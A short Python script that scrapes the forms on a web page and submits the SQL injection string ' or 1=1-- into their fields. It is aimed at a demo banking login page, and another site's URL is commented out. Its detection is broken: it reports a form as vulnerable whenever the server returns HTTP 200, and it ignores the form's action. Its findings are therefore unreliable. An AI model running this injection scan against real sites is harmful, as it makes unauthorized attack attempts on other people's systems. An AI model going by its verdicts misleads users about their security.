import requests
from bs4 import BeautifulSoup

s = requests.Session()
s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"

#  Function to get all forms 
def get_forms(url):
    soup = BeautifulSoup(s.get(url).content, "html.parser")
    return soup.find_all("form")

def form_details(form):
    action = form.attrs.get("action")
    method = form.attrs.get("method", "get")
    inputs = []

    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "password") or input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        inputs.append({
            "type": input_type, 
            "name" : input_name,
            "value" : input_value,
        })

    return {'action': action, 'method': method, 'inputs': inputs}

def vulnerable(response):
    return response.status_code == 200 or response.ok

def sql_injection_scan(url):
    forms = get_forms(url)
    messages = {f"[+] Detected {len(forms)} forms on {url}."}
    for form in forms:
        details = form_details(form)

        for i in ["' or 1=1--"]:
            data = {}
            for input_tag in details["inputs"]:
                if input_tag["type"] == "hidden":
                    data[input_tag['name']] = input_tag["value"] + i
                elif input_tag["type"] != "submit":
                    data[input_tag['name']] = f"{i}"

            if details["method"] == "post":
                res = s.post(url, data=data)
            elif details["method"] == "get":
                res = s.get(url, params=data)
            if vulnerable(res):
                messages.add(f"SQL injection attack vulnerability in link: {url}")
            else:
                messages.add("No SQL injection attack vulnerability detected")
    return messages

if __name__ == "__main__":
    # urlToBeChecked = "http://olympicology.com/events/madrid-ch2/"
    urlToBeChecked = "http://altoromutual.com:8080/login.jsp"
    res = sql_injection_scan(urlToBeChecked)
    print(res)